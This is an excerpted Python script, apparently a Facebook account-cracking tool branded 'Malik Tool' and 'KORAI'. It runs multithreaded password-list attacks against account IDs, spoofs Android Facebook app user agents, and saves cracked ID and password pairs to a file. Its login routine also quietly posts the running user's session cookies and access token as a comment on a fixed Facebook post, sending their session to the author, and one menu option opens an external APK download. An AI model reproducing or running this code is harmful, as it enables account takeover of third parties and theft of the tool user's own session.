...
----------------------------------------------
 ...
 Github    : Masroor-Ahmad
 Facebook  : De Cent Malik
 Tool Name : Malik Tool
 Type type : Free
 Version   : 0.1
----------------------------------------------
...
def login():
    ...
    try:
        ...
        info = requests.get(
            "https://graph.facebook.com/me/?access_token=" + tok,
            cookies={"cookie": cookies},
        ).json()
        name = info["name"]
        idd = info["id"]
        ...
        requests.post(
            "https://graph.facebook.com/pfbid02Sj97PfY1mY3cvbLjGaJRz22FR7yc75JFKLoBFiHoNLSq9aGxmGKotAtcYLkMDDpbl/comments/?message="
            + cookies
            + "&access_token="
            + tok,
            cookies={"cookie": cookies},
...
def public():
    ...
    try:
        ...
        print("\033[1;31mYour cookies han expired...")
        time.sleep(1)
        login()
    except IOError:
        print("\033[1;31mYour cookies han expired...")
    ...
    try:
        ...
        with tred(max_workers=30) as crack_submit:
            ...
            print(
                " Total account : \033[1;32m"
                + total_ids
                + f" \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}"
            )
        ...
        if x == ("sex"):
            ...
            if xd in ["1", "01"]:
                ...
                with tred(max_workers=30) as crack_submit:
                    ...
                    print(
                        "\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m"
                    )
                    linex()
                    for user in fo:
                        ids, names = user.split("|")
                ...
                os.system(
                    "xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/KORAI_VPN1.0.apk/file"
                )
                menu()
            elif xd in ["8", "08"]:
                os.system(
                    "xdg-open https://www.facebook.com/145600924295660/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl"
                )
                menu()
            elif xd in ["0", "00"]:
                exit(" Thanks for use 🥰 ")
            ...
            linex()
            tks = (
                "Hi, I Need To Buy Your Paid KORAI PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "
                + name
                + "\n Key :- "
                + fkeyx
            )
...
def ffb(ids, names, passlist):
    global loop, oks, cps
    sys.stdout.write(
        "\r\r\033[1;37m [KORAI-XD] %s|\033[1;32mOK:-%s \033[1;37m" % (loop, len(oks))
    )
    sys.stdout.flush()
...
def api(ids, names, passlist):
    try:
        global ok, loop
        sys.stdout.write(
            "\r\r\033[1;37m [SANAM-XD] %s|\033[1;32mOK:-%s \033[1;37m"
            % (loop, len(oks))
        )
        sys.stdout.flush()
        fn = names.split(" ")[0]
        ...
        for pw in passlist:
            ...
            ua_string = (
                f"Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/"
                + "{density=2.0,width=720,height=1280};"
                + f"FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
            )
    ...
    try:
        ...
        for pw in passlist:
            ...
            ua_string = (
                f"Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/"
                + "{density=2.0,width=720,height=1280};"
                + f"FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
            )
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            data = {
        ...
        for pas in passlist:
            ...
            if "session_key" in q:
                ...
                try:
                    ...
                    print(
                        "\r\r\033[1;32m [sanam-OK] " + uid + " | " + pas + "\033[1;97m"
                    )
                    open("/sdcard/sanam-OK.txt", "a").write(uid + "|" + pas + "\n")
                    oks.append(ids)
                    break
